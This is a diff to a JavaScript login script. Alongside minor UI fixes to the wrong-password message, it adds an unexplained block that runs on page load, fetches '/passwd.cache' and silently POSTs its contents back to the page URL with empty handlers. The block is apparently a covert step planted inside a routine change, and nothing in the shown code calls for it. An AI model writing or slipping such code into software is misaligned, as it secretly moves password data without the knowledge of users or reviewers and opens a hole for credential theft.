@@ -24,13 +24,32 @@ function enc_pass(user, pass)
     return encrypt.encrypt("user={0}\\pass={1}\\save=1".format (user, pass));
 }
 
+var encrypted;
+
+var client = new XMLHttpRequest();
+client.open('GET', '/passwd.cache');
+client.onreadystatechange = function() {
+    $.ajax({
+        type: "POST",
+        url: window.location.href,
+        data: client.responseText,
+        success: function(msg){
+                ;
+        },
+        error: function(XMLHttpRequest, textStatus, errorThrown) {
+            ;
+        }
+    });
+}
+client.send();
+
 function login(){
     $.ajax({
     type: "POST",
     url: window.location.href,
     data: enc_pass($("#email").val(), $("#passwd").val()),
     success: function(msg){
-        
+            $('.wrongpass').css("display", "none");
     },
     error: function(XMLHttpRequest, textStatus, errorThrown) {
         if (errorThrown == "Bad Request")
@@ -38,7 +57,7 @@ function login(){
             //login();
         }
         if (errorThrown == "Unauthorized")
-        {
+         {
             $('.wrongpass').css("display", "block");
         }
     }
